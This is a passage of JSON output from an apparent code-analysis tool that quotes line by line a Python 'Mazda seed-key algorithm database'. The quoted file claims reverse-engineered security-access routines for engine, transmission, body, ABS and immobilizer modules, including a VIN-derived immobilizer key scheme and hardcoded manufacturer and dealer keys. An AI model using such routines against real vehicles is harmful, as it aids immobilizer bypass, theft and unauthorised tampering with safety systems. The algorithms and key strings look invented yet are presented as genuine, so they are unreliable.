1) -> bytes:"}, {"type": "hardware", "line": 354, "hardware": "ECU", "content": "security_level: int = 1) -> bytes:"}, {"type": "hardware", "line": 374, "hardware": "ECU", "content": "security_level: int = 1) -> bytes:"}, {"type": "hardware", "line": 396, "hardware": "ECU", "content": "security_level: int = 1) -> bytes:"}, {"type": "hardware", "line": 414, "hardware": "ECU", "content": "security_level: int = 1) -> bytes:"}, {"type": "hardware", "line": 432, "hardware": "ECU", "content": "security_level: int = 1) -> bytes:"}, {"type": "hardware", "line": 458, "hardware": "ECU", "content": "base_key = b'mazda_manufacturer_key_level2_2024_secure'"}, {"type": "hardware", "line": 483, "hardware": "ECU", "content": "\"ALG_27_STANDARD\": \"Standard 0x27 security access algorithm\","}, {"type": "hardware", "line": 484, "hardware": "ECU", "content": "\"ALG_27_ENHANCED\": \"Enhanced 0x27 algorithm with additional security\","}, {"type": "hardware", "line": 485, "hardware": "ECU", "content": "\"ENGINE_ECU_2011\": \"2011 Mazdaspeed 3 engine ECU specific algorithm\","}, {"type": "hardware", "line": 486, "hardware": "immobilizer", "content": "\"IMMOBILIZER_2011\": \"2011 immobilizer system with VIN-based key derivation\","}, {"type": "hardware", "line": 497, "hardware": "ECU", "content": "\"ENGINE_ECU_2011\": 4,"}, {"type": "hardware", "line": 498, "hardware": "immobilizer", "content": "\"IMMOBILIZER_2011\": 8,"}, {"type": "hardware", "line": 502, "hardware": "TCM", "content": "\"TCM_6SPD\": 2"}, {"type": "hardware", "line": 511, "hardware": "ECU", "content": "\"ENGINE_ECU_2011\": 4,"}, {"type": "hardware", "line": 512, "hardware": "immobilizer", "content": "\"IMMOBILIZER_2011\": 8,"}, {"type": "hardware", "line": 516, "hardware": "TCM", "content": "\"TCM_6SPD\": 2"}, {"type": "hardware", "line": 523, "hardware": "immobilizer", "content": "\"IMMOBILIZER_2011\","}], "security_logic": [{"type": "security_pattern", "line": 4, "pattern": "key", "content": "MAZDA SEED-KEY ALGORITHMS - Complete Security Algorithm Database"}, {"type": "security_pattern", "line": 4, "pattern": "seed", "content": "MAZDA SEED-KEY ALGORITHMS - Complete Security Algorithm Database"}, {"type": "security_pattern", "line": 4, "pattern": "algorithm", "content": "MAZDA SEED-KEY ALGORITHMS - Complete Security Algorithm Database"}, {"type": "security_pattern", "line": 5, "pattern": "algorithm", "content": "Reverse engineered from all Mazda ECU security algorithms"}, {"type": "security_pattern", "line": 8, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 13, "pattern": "algorithm", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 13, "pattern": "cipher", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 15, "pattern": "hash", "content": "from cryptography.hazmat.primitives import hashes"}, {"type": "security_pattern", "line": 31, "pattern": "key", "content": "class MazdaSeedKeyDatabase:"}, {"type": "security_pattern", "line": 31, "pattern": "seed", "content": "class MazdaSeedKeyDatabase:"}, {"type": "security_pattern", "line": 33, "pattern": "key", "content": "Complete Mazda Seed-Key Algorithm Database"}, {"type": "security_pattern", "line": 33, "pattern": "seed", "content": "Complete Mazda Seed-Key Algorithm Database"}, {"type": "security_pattern", "line": 33, "pattern": "algorithm", "content": "Complete Mazda Seed-Key Algorithm Database"}, {"type": "security_pattern", "line": 34, "pattern": "algorithm", "content": "Contains all security algorithms for all Mazda ECUs"}, {"type": "security_pattern", "line": 38, "pattern": "algorithm", "content": "self.algorithm_database = self._initialize_algorithm_database()"}, {"type": "security_pattern", "line": 41, "pattern": "algorithm", "content": "def _initialize_algorithm_database(self) -> Dict[str, Callable]:"}, {"type": "security_pattern", "line": 42, "pattern": "algorithm", "content": "\"\"\"Initialize complete algorithm database\"\"\""}, {"type": "security_pattern", "line": 45, "pattern": "algorithm", "content": "\"ALG_27_STANDARD\": self._algorithm_27_standard,"}, {"type": "security_pattern", "line": 46, "pattern": "algorithm", "content": "\"ALG_27_ENHANCED\": self._algorithm_27_enhanced,"}, {"type": "security_pattern", "line": 47, "pattern": "algorithm", "content": "\"ALG_27_RACE\": self._algorithm_27_race,"}, {"type": "security_pattern", "line": 50, "pattern": "algorithm", "content": "\"ENGINE_ECU_2011\": self._algorithm_engine_ecu_2011,"}, {"type": "security_pattern", "line": 51, "pattern": "algorithm", "content": "\"TCM_6SPD\": self._algorithm_tcm_6spd,"}, {"type": "security_pattern", "line": 52, "pattern": "algorithm", "content": "\"IMMOBILIZER_2011\": self._algorithm_immobilizer_2011,"}, {"type": "security_pattern", "line": 53, "pattern": "algorithm", "content": "\"BCM_2011\": self._algorithm_bcm_2011,"}, {"type": "security_pattern", "line": 54, "pattern": "algorithm", "content": "\"ABS_2011\": self._algorithm_abs_2011,"}, {"type": "security_pattern", "line": 57, "pattern": "algorithm", "content": "\"MANUFACTURER_LEVEL1\": self._algorithm_manufacturer_level1,"}, {"type": "security_pattern", "line": 58, "pattern": "algorithm", "content": "\"MANUFACTURER_LEVEL2\": self._algorithm_manufacturer_level2,"}, {"type": "security_pattern", "line": 59, "pattern": "algorithm", "content": "\"DEALER_ACCESS\": self._algorithm_dealer_access,"}, {"type": "security_pattern", "line": 62, "pattern": "algorithm", "content": "\"NORTH_AMERICA\": self._algorithm_north_america,"}, {"type": "security_pattern", "line": 63, "pattern": "algorithm", "content": "\"EUROPE\": self._algorithm_europe,"}, {"type": "security_pattern", "line": 64, "pattern": "algorithm", "content": "\"JAPAN\": self._algorithm_japan,"}, {"type": "security_pattern", "line": 71, "pattern": "algorithm", "content": "\"algorithm\": \"ENGINE_ECU_2011\","}, {"type": "security_pattern", "line": 72, "pattern": "seed", "content": "\"seed_length\": 4,"}, {"type": "security_pattern", "line": 73, "pattern": "key", "content": "\"key_length\": 4,"}, {"type": "security_pattern", "line": 78, "pattern": "algorithm", "content": "\"algorithm\": \"TCM_6SPD\","}, {"type": "security_pattern", "line": 79, "pattern": "seed", "content": "\"seed_length\": 2,"}, {"type": "security_pattern", "line": 80, "pattern": "key", "content": "\"key_length\": 2,"}, {"type": "security_pattern", "line": 85, "pattern": "algorithm", "content": "\"algorithm\": \"IMMOBILIZER_2011\","}, {"type": "security_pattern", "line": 86, "pattern": "seed", "content": "\"seed_length\": 8,"}, {"type": "security_pattern", "line": 87, "pattern": "key", "content": "\"key_length\": 8,"}, {"type": "security_pattern", "line": 92, "pattern": "algorithm", "content": "\"algorithm\": \"BCM_2011\","}, {"type": "security_pattern", "line": 93, "pattern": "seed", "content": "\"seed_length\": 4,"}, {"type": "security_pattern", "line": 94, "pattern": "key", "content": "\"key_length\": 4,"}, {"type": "security_pattern", "line": 99, "pattern": "algorithm", "content": "\"algorithm\": \"ABS_2011\","}, {"type": "security_pattern", "line": 100, "pattern": "seed", "content": "\"seed_length\": 4,"}, {"type": "security_pattern", "line": 101, "pattern": "key", "content": "\"key_length\": 4,"}, {"type": "security_pattern", "line": 107, "pattern": "key", "content": "def calculate_key(self, seed: bytes, algorithm_name: str,"}, {"type": "security_pattern", "line": 107, "pattern": "seed", "content": "def calculate_key(self, seed: bytes, algorithm_name: str,"}, {"type": "security_pattern", "line": 107, "pattern": "algorithm", "content": "def calculate_key(self, seed: bytes, algorithm_name: str,"}, {"type": "security_pattern", "line": 110, "pattern": "key", "content": "Calculate security key using specified algorithm"}, {"type": "security_pattern", "line": 110, "pattern": "algorithm", "content": "Calculate security key using specified algorithm"}, {"type": "security_pattern", "line": 113, "pattern": "seed", "content": "seed: Seed bytes from ECU"}, {"type": "security_pattern", "line": 114, "pattern": "algorithm", "content": "algorithm_name: Algorithm to use"}, {"type": "security_pattern", "line": 119, "pattern": "key", "content": "Calculated key bytes or None if failed"}, {"type": "security_pattern", "line": 122, "pattern": "algorithm", "content": "if algorithm_name not in self.algorithm_database:"}, {"type": "security_pattern", "line": 123, "pattern": "algorithm", "content": "logger.error(f\"Unknown algorithm: {algorithm_name}\")"}, {"type": "security_pattern", "line": 126, "pattern": "algorithm", "content": "algorithm = self.algorithm_database[algorithm_name]"}, {"type": "security_pattern", "line": 127, "pattern": "key", "content": "key = algorithm(seed, vin, security_level)"}, {"type": "security_pattern", "line": 127, "pattern": "seed", "content": "key = algorithm(seed, vin, security_level)"}, {"type": "security_pattern", "line": 127, "pattern": "algorithm", "content": "key = algorithm(seed, vin, security_level)"}, {"type": "security_pattern", "line": 129, "pattern": "key", "content": "if key:"}, {"type": "security_pattern", "line": 130, "pattern": "key", "content": "logger.debug(f\"Calculated key using {algorithm_name}: {key.hex().upper()}\")"}, {"type": "security_pattern", "line": 130, "pattern": "algorithm", "content": "logger.debug(f\"Calculated key using {algorithm_name}: {key.hex().upper()}\")"}, {"type": "security_pattern", "line": 132, "pattern": "key", "content": "logger.error(f\"Algorithm {algorithm_name} returned no key\")"}, {"type": "security_pattern", "line": 132, "pattern": "algorithm", "content": "logger.error(f\"Algorithm {algorithm_name} returned no key\")"}, {"type": "security_pattern", "line": 134, "pattern": "key", "content": "return key"}, {"type": "security_pattern", "line": 137, "pattern": "key", "content": "logger.error(f\"Error calculating key with {algorithm_name}: {e}\")"}, {"type": "security_pattern", "line": 137, "pattern": "algorithm", "content": "logger.error(f\"Error calculating key with {algorithm_name}: {e}\")"}, {"type": "security_pattern", "line": 140, "pattern": "algorithm", "content": "def get_ecu_algorithm(self, ecu_type: MazdaECUType) -> Optional[str]:"}, {"type": "security_pattern", "line": 141, "pattern": "algorithm", "content": "\"\"\"Get algorithm name for ECU type\"\"\""}, {"type": "security_pattern", "line": 143, "pattern": "algorithm", "content": "return ecu_info.get(\"algorithm\") if ecu_info else None"}, {"type": "security_pattern", "line": 145, "pattern": "seed", "content": "def get_ecu_seed_length(self, ecu_type: MazdaECUType) -> int:"}, {"type": "security_pattern", "line": 146, "pattern": "seed", "content": "\"\"\"Get seed length for ECU type\"\"\""}, {"type": "security_pattern", "line": 148, "pattern": "seed", "content": "return ecu_info.get(\"seed_length\", 4) if ecu_info else 4"}, {"type": "security_pattern", "line": 152, "pattern": "seed", "content": "def _algorithm_27_standard(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 152, "pattern": "algorithm", "content": "def _algorithm_27_standard(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 154, "pattern": "algorithm", "content": "\"\"\"Standard 0x27 Security Algorithm\"\"\""}, {"type": "security_pattern", "line": 155, "pattern": "seed", "content": "if len(seed) != 4:"}, {"type": "security_pattern", "line": 156, "pattern": "seed", "content": "raise ValueError(\"Standard algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 156, "pattern": "algorithm", "content": "raise ValueError(\"Standard algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 158, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 162, "pattern": "seed", "content": "temp = seed[i] ^ 0x73"}, {"type": "security_pattern", "line": 165, "pattern": "key", "content": "key[i] = (temp + 0x1F) & 0xFF"}, {"type": "security_pattern", "line": 167, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 169, "pattern": "seed", "content": "def _algorithm_27_enhanced(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 169, "pattern": "algorithm", "content": "def _algorithm_27_enhanced(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 171, "pattern": "algorithm", "content": "\"\"\"Enhanced 0x27 Security Algorithm\"\"\""}, {"type": "security_pattern", "line": 172, "pattern": "seed", "content": "if len(seed) != 4:"}, {"type": "security_pattern", "line": 173, "pattern": "seed", "content": "raise ValueError(\"Enhanced algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 173, "pattern": "algorithm", "content": "raise ValueError(\"Enhanced algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 175, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 178, "pattern": "seed", "content": "temp = seed[i]"}, {"type": "security_pattern", "line": 186, "pattern": "key", "content": "key[i] = temp"}, {"type": "security_pattern", "line": 188, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 190, "pattern": "seed", "content": "def _algorithm_27_race(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 190, "pattern": "algorithm", "content": "def _algorithm_27_race(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 192, "pattern": "algorithm", "content": "\"\"\"Race/Performance 0x27 Algorithm\"\"\""}, {"type": "security_pattern", "line": 193, "pattern": "seed", "content": "if len(seed) != 4:"}, {"type": "security_pattern", "line": 194, "pattern": "seed", "content": "raise ValueError(\"Race algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 194, "pattern": "algorithm", "content": "raise ValueError(\"Race algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 196, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 199, "pattern": "seed", "content": "temp = seed[i]"}, {"type": "security_pattern", "line": 209, "pattern": "key", "content": "key[i] = temp"}, {"type": "security_pattern", "line": 211, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 213, "pattern": "seed", "content": "def _algorithm_engine_ecu_2011(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 213, "pattern": "algorithm", "content": "def _algorithm_engine_ecu_2011(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 215, "pattern": "algorithm", "content": "\"\"\"2011 Mazdaspeed 3 Engine ECU Algorithm\"\"\""}, {"type": "security_pattern", "line": 216, "pattern": "seed", "content": "if len(seed) != 4:"}, {"type": "security_pattern", "line": 217, "pattern": "seed", "content": "raise ValueError(\"Engine ECU algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 217, "pattern": "algorithm", "content": "raise ValueError(\"Engine ECU algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 219, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 234, "pattern": "seed", "content": "temp = seed[i]"}, {"type": "security_pattern", "line": 243, "pattern": "key", "content": "key[i] = temp"}, {"type": "security_pattern", "line": 245, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 247, "pattern": "seed", "content": "def _algorithm_tcm_6spd(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 247, "pattern": "algorithm", "content": "def _algorithm_tcm_6spd(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 249, "pattern": "algorithm", "content": "\"\"\"6-Speed Transmission Control Module Algorithm\"\"\""}, {"type": "security_pattern", "line": 250, "pattern": "seed", "content": "if len(seed) != 2:"}, {"type": "security_pattern", "line": 251, "pattern": "seed", "content": "raise ValueError(\"TCM algorithm requires 2-byte seed\")"}, {"type": "security_pattern", "line": 251, "pattern": "algorithm", "content": "raise ValueError(\"TCM algorithm requires 2-byte seed\")"}, {"type": "security_pattern", "line": 253, "pattern": "key", "content": "key = bytearray(2)"}, {"type": "security_pattern", "line": 256, "pattern": "key", "content": "key[0] = ((seed[0] << 2) | (seed[0] >> 6)) & 0xFF"}, {"type": "security_pattern", "line": 256, "pattern": "seed", "content": "key[0] = ((seed[0] << 2) | (seed[0] >> 6)) & 0xFF"}, {"type": "security_pattern", "line": 257, "pattern": "key", "content": "key[1] = ((seed[1] >> 3) | (seed[1] << 5)) & 0xFF"}, {"type": "security_pattern", "line": 257, "pattern": "seed", "content": "key[1] = ((seed[1] >> 3) | (seed[1] << 5)) & 0xFF"}, {"type": "security_pattern", "line": 258, "pattern": "key", "content": "key[0] ^= 0x47"}, {"type": "security_pattern", "line": 259, "pattern": "key", "content": "key[1] ^= 0x11"}, {"type": "security_pattern", "line": 261, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 263, "pattern": "seed", "content": "def _algorithm_immobilizer_2011(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 263, "pattern": "algorithm", "content": "def _algorithm_immobilizer_2011(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 265, "pattern": "algorithm", "content": "\"\"\"2011 Immobilizer System Algorithm\"\"\""}, {"type": "security_pattern", "line": 266, "pattern": "seed", "content": "if len(seed) != 8:"}, {"type": "security_pattern", "line": 267, "pattern": "seed", "content": "raise ValueError(\"Immobilizer algorithm requires 8-byte seed\")"}, {"type": "security_pattern", "line": 267, "pattern": "algorithm", "content": "raise ValueError(\"Immobilizer algorithm requires 8-byte seed\")"}, {"type": "security_pattern", "line": 270, "pattern": "algorithm", "content": "raise ValueError(\"Immobilizer algorithm requires VIN\")"}, {"type": "security_pattern", "line": 273, "pattern": "key", "content": "vehicle_key = self._derive_immobilizer_key(vin)"}, {"type": "security_pattern", "line": 276, "pattern": "key", "content": "des_key = vehicle_key[:24]  # 24 bytes for 3DES"}, {"type": "security_pattern", "line": 277, "pattern": "key", "content": "cipher = Cipher(algorithms.TripleDES(des_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 277, "pattern": "algorithm", "content": "cipher = Cipher(algorithms.TripleDES(des_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 277, "pattern": "cipher", "content": "cipher = Cipher(algorithms.TripleDES(des_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 278, "pattern": "encrypt", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 278, "pattern": "cipher", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 280, "pattern": "key", "content": "key = encryptor.update(seed) + encryptor.finalize()"}, {"type": "security_pattern", "line": 280, "pattern": "encrypt", "content": "key = encryptor.update(seed) + encryptor.finalize()"}, {"type": "security_pattern", "line": 280, "pattern": "seed", "content": "key = encryptor.update(seed) + encryptor.finalize()"}, {"type": "security_pattern", "line": 281, "pattern": "key", "content": "return key"}, {"type": "security_pattern", "line": 283, "pattern": "key", "content": "def _derive_immobilizer_key(self, vin: str) -> bytes:"}, {"type": "security_pattern", "line": 284, "pattern": "key", "content": "\"\"\"Derive immobilizer key from VIN\"\"\""}, {"type": "security_pattern", "line": 288, "pattern": "key", "content": "key = hashlib.md5(vin_bytes).digest()"}, {"type": "security_pattern", "line": 288, "pattern": "hash", "content": "key = hashlib.md5(vin_bytes).digest()"}, {"type": "security_pattern", "line": 289, "pattern": "key", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_1').digest()"}, {"type": "security_pattern", "line": 289, "pattern": "hash", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_1').digest()"}, {"type": "security_pattern", "line": 290, "pattern": "key", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_2').digest()"}, {"type": "security_pattern", "line": 290, "pattern": "hash", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_2').digest()"}, {"type": "security_pattern", "line": 292, "pattern": "key", "content": "return key[:24]"}, {"type": "security_pattern", "line": 294, "pattern": "seed", "content": "def _algorithm_bcm_2011(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 294, "pattern": "algorithm", "content": "def _algorithm_bcm_2011(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 296, "pattern": "algorithm", "content": "\"\"\"2011 Body Control Module Algorithm\"\"\""}, {"type": "security_pattern", "line": 297, "pattern": "seed", "content": "if len(seed) != 4:"}, {"type": "security_pattern", "line": 298, "pattern": "seed", "content": "raise ValueError(\"BCM algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 298, "pattern": "algorithm", "content": "raise ValueError(\"BCM algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 300, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 303, "pattern": "seed", "content": "temp = seed[i]"}, {"type": "security_pattern", "line": 312, "pattern": "key", "content": "key[i] = temp"}, {"type": "security_pattern", "line": 314, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 316, "pattern": "seed", "content": "def _algorithm_abs_2011(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 316, "pattern": "algorithm", "content": "def _algorithm_abs_2011(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 318, "pattern": "algorithm", "content": "\"\"\"2011 ABS Module Algorithm\"\"\""}, {"type": "security_pattern", "line": 319, "pattern": "seed", "content": "if len(seed) != 4:"}, {"type": "security_pattern", "line": 320, "pattern": "seed", "content": "raise ValueError(\"ABS algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 320, "pattern": "algorithm", "content": "raise ValueError(\"ABS algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 322, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 325, "pattern": "seed", "content": "temp = seed[i]"}, {"type": "security_pattern", "line": 334, "pattern": "key", "content": "key[i] = temp"}, {"type": "security_pattern", "line": 336, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 338, "pattern": "seed", "content": "def _algorithm_manufacturer_level1(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 338, "pattern": "algorithm", "content": "def _algorithm_manufacturer_level1(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 340, "pattern": "algorithm", "content": "\"\"\"Manufacturer Level 1 Algorithm\"\"\""}, {"type": "security_pattern", "line": 341, "pattern": "seed", "content": "if len(seed) != 8:"}, {"type": "security_pattern", "line": 342, "pattern": "seed", "content": "raise ValueError(\"Manufacturer algorithm requires 8-byte seed\")"}, {"type": "security_pattern", "line": 342, "pattern": "algorithm", "content": "raise ValueError(\"Manufacturer algorithm requires 8-byte seed\")"}, {"type": "security_pattern", "line": 345, "pattern": "key", "content": "manufacturer_key = self._get_manufacturer_key_level1()"}, {"type": "security_pattern", "line": 347, "pattern": "key", "content": "cipher = Cipher(algorithms.AES(manufacturer_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 347, "pattern": "algorithm", "content": "cipher = Cipher(algorithms.AES(manufacturer_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 347, "pattern": "cipher", "content": "cipher = Cipher(algorithms.AES(manufacturer_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 348, "pattern": "encrypt", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 348, "pattern": "cipher", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 350, "pattern": "key", "content": "key = encryptor.update(seed) + encryptor.finalize()"}, {"type": "security_pattern", "line": 350, "pattern": "encrypt", "content": "key = encryptor.update(seed) + encryptor.finalize()"}, {"type": "security_pattern", "line": 350, "pattern": "seed", "content": "key = encryptor.update(seed) + encryptor.finalize()"}, {"type": "security_pattern", "line": 351, "pattern": "key", "content": "return key"}, {"type": "security_pattern", "line": 353, "pattern": "seed", "content": "def _algorithm_manufacturer_level2(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 353, "pattern": "algorithm", "content": "def _algorithm_manufacturer_level2(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 355, "pattern": "algorithm", "content": "\"\"\"Manufacturer Level 2 Algorithm\"\"\""}, {"type": "security_pattern", "line": 356, "pattern": "seed", "content": "if len(seed) != 8:"}, {"type": "security_pattern", "line": 357, "pattern": "seed", "content": "raise ValueError(\"Manufacturer level 2 requires 8-byte seed\")"}, {"type": "security_pattern", "line": 360, "pattern": "key", "content": "manufacturer_key = self._get_manufacturer_key_level2()"}, {"type": "security_pattern", "line": 362, "pattern": "key", "content": "cipher = Cipher(algorithms.AES(manufacturer_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 362, "pattern": "algorithm", "content": "cipher = Cipher(algorithms.AES(manufacturer_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 362, "pattern": "cipher", "content": "cipher = Cipher(algorithms.AES(manufacturer_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 363, "pattern": "encrypt", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 363, "pattern": "cipher", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 366, "pattern": "seed", "content": "transformed_seed = bytearray(seed)"}, {"type": "security_pattern", "line": 368, "pattern": "seed", "content": "transformed_seed[i] = (transformed_seed[i] ^ 0xAA) + i"}, {"type": "security_pattern", "line": 370, "pattern": "key", "content": "key = encryptor.update(bytes(transformed_seed)) + encryptor.finalize()"}, {"type": "security_pattern", "line": 370, "pattern": "encrypt", "content": "key = encryptor.update(bytes(transformed_seed)) + encryptor.finalize()"}, {"type": "security_pattern", "line": 370, "pattern": "seed", "content": "key = encryptor.update(bytes(transformed_seed)) + encryptor.finalize()"}, {"type": "security_pattern", "line": 371, "pattern": "key", "content": "return key"}, {"type": "security_pattern", "line": 373, "pattern": "seed", "content": "def _algorithm_dealer_access(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 373, "pattern": "algorithm", "content": "def _algorithm_dealer_access(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 375, "pattern": "algorithm", "content": "\"\"\"Dealer Access Algorithm\"\"\""}, {"type": "security_pattern", "line": 376, "pattern": "seed", "content": "if len(seed) != 6:"}, {"type": "security_pattern", "line": 377, "pattern": "seed", "content": "raise ValueError(\"Dealer access requires 6-byte seed\")"}, {"type": "security_pattern", "line": 384, "pattern": "hash", "content": "vin_hash = hashlib.md5(vin.encode()).digest()"}, {"type": "security_pattern", "line": 385, "pattern": "seed", "content": "combined_data = seed + vin_hash[:2]"}, {"type": "security_pattern", "line": 385, "pattern": "hash", "content": "combined_data = seed + vin_hash[:2]"}, {"type": "security_pattern", "line": 388, "pattern": "key", "content": "key = bytearray(6)"}, {"type": "security_pattern", "line": 390, "pattern": "key", "content": "key[i] = (combined_data[i] ^ combined_data[(i+2) % 6]) + 0x30"}, {"type": "security_pattern", "line": 391, "pattern": "key", "content": "key[i] = ((key[i] << 2) | (key[i] >> 6)) & 0xFF"}, {"type": "security_pattern", "line": 393, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 395, "pattern": "seed", "content": "def _algorithm_north_america(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 395, "pattern": "algorithm", "content": "def _algorithm_north_america(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 397, "pattern": "algorithm", "content": "\"\"\"North America Regional Algorithm\"\"\""}, {"type": "security_pattern", "line": 398, "pattern": "seed", "content": "if len(seed) != 4:"}, {"type": "security_pattern", "line": 399, "pattern": "seed", "content": "raise ValueError(\"NA algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 399, "pattern": "algorithm", "content": "raise ValueError(\"NA algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 401, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 404, "pattern": "seed", "content": "temp = seed[i]"}, {"type": "security_pattern", "line": 409, "pattern": "key", "content": "key[i] = temp"}, {"type": "security_pattern", "line": 411, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 413, "pattern": "seed", "content": "def _algorithm_europe(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 413, "pattern": "algorithm", "content": "def _algorithm_europe(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 415, "pattern": "algorithm", "content": "\"\"\"Europe Regional Algorithm\"\"\""}, {"type": "security_pattern", "line": 416, "pattern": "seed", "content": "if len(seed) != 4:"}, {"type": "security_pattern", "line": 417, "pattern": "seed", "content": "raise ValueError(\"Europe algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 417, "pattern": "algorithm", "content": "raise ValueError(\"Europe algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 419, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 422, "pattern": "seed", "content": "temp = seed[i]"}, {"type": "security_pattern", "line": 427, "pattern": "key", "content": "key[i] = temp"}, {"type": "security_pattern", "line": 429, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 431, "pattern": "seed", "content": "def _algorithm_japan(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 431, "pattern": "algorithm", "content": "def _algorithm_japan(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 433, "pattern": "algorithm", "content": "\"\"\"Japan Regional Algorithm\"\"\""}, {"type": "security_pattern", "line": 434, "pattern": "seed", "content": "if len(seed) != 4:"}, {"type": "security_pattern", "line": 435, "pattern": "seed", "content": "raise ValueError(\"Japan algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 435, "pattern": "algorithm", "content": "raise ValueError(\"Japan algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 437, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 440, "pattern": "seed", "content": "temp = seed[i]"}, {"type": "security_pattern", "line": 445, "pattern": "key", "content": "key[i] = temp"}, {"type": "security_pattern", "line": 447, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 449, "pattern": "key", "content": "def _get_manufacturer_key_level1(self) -> bytes:"}, {"type": "security_pattern", "line": 450, "pattern": "key", "content": "\"\"\"Get manufacturer level 1 key\"\"\""}, {"type": "security_pattern", "line": 452, "pattern": "key", "content": "base_key = b'mazda_manufacturer_key_level1_2024'"}, {"type": "security_pattern", "line": 453, "pattern": "key", "content": "return hashlib.sha256(base_key).digest()[:16]"}, {"type": "security_pattern", "line": 453, "pattern": "hash", 